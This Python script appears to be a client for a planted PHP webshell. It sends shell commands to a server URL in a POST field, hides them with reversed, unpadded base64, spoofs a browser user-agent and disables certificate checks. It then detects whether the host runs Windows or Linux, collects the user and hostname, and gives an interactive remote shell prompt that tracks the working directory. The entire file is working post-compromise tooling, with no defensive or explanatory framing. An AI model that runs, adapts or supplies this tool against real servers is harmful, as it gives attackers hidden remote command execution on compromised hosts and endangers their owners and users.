import requests, base64, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
#https://stackoverflow.com/a/41041028/13886183
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

  
WEBSHELL_URL = 'http://localhost/server.php'

def x_encode(text):
    return base64.b64encode(text.encode()).decode().replace('=', '')[::-1]

def x_decode(text):
    pads = (4 - (len(text) % 4))
    text = text[::-1] + (('=' * pads) if pads != 4 else '')

    return base64.b64decode(text).decode('latin-1')

def send(cmd, is_win=False):
    try:
        res = requests.post(WEBSHELL_URL, data={
            'v': x_encode(cmd + ' 2>&1')
        }, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }, allow_redirects=False, verify=False)

        if res.status_code == 200:
            return True, x_decode(res.text).strip()

        return False, f'{res.status_code} - {res.reason}'

    except Exception as e:
        return False, str(e)

def getPwd():
    # Try windows
    success, ret = send('echo "%cd%"')

    if not success:
        return False, None, None

    if len(ret) > 0 and ret.find('\\') > -1:
        return True, True, ret.replace('"', '')

    # Try linux
    success, ret = send('pwd')

    if success and len(ret) > 0 and ret.find('/') > -1:
        return True, False, ret

    return success, None, None

def getInfo():

    success, ret = send('whoami;hostname')

    if success and len(ret) > 0:
        ret = ret.split('\n')
        if len(ret) == 2 and len(ret[0]) > 0 and len(ret[1]) > 0:
            return ret[0] + '@' + ret[1]
    
    if not success:
        print(ret)

    return None

def main():

    success, iswin, pwd = getPwd()

    if not success:
        return print('Não foi possível enviar comandos para webshell')
    
    if iswin == None:
        return print('Sistema operacional não detectado')

    unix_info = None
    if not iswin:
        unix_info = getInfo()
        if not unix_info:
            return print('Não foi possível obter informação de usuário e hostname do sistema')
        

    rg = re.compile(r'cd (.*)', re.IGNORECASE)

    using_cd = False
    cd_disk = 'c:'
    if iswin:
        temp = re.match(r'^(c|d|e|f|g|h|i|j):', pwd, re.IGNORECASE)
        if temp:
            cd_disk = temp[1] + ':'
    while True:


    
        cmd = input(pwd + '>' if iswin else '{0}:{1}$ '.format(unix_info, pwd)).strip()

        if len(cmd) < 1:
            continue

        if cmd.lower() in ['quit', 'exit']:
            return True

        
        # change disk
        if iswin and len(cmd) == 2 and re.match(r'^(c|d|e|f|g|h|i|j):', cmd, re.IGNORECASE):
            cmd += '&cd'
            using_cd = True

        if cmd.startswith("cd") and len(cmd.replace('cd', '').replace(' ', '')) > 0:
            if iswin:
                cmd = '{0} & cd {1} & {2} & cd'.format(cd_disk, pwd, cmd)
            else:
                cmd = 'cd {0} && {1} && pwd'.format(pwd, cmd)
            using_cd = True

        if using_cd:
            using_cd = False
            status, msg = send(cmd)
            if status:
                if iswin and msg.find('\\') > -1:
                    temp = re.match(r'^(c|d|e|f|g|h|i|j):', msg, re.IGNORECASE)
                    if temp:
                        cd_disk = temp[1] + ':'

                    pwd = msg
                    continue
                elif not iswin and msg.find('/') > -1:
                    pwd = msg
                    continue
            
            if len(msg) > 0:
                print(msg)

            continue
            
        if iswin:
            cmd = '{0} & cd "{1}" & {2}'.format(cd_disk, pwd, cmd)
        else:
            cmd = "cd '{0}' && {1}".format(pwd, cmd)
        status, msg = send(cmd)

        if not status:
            print(msg)
        else:
            if len(msg) > 0:
                print(msg)
        
if __name__ == '__main__':
    main()
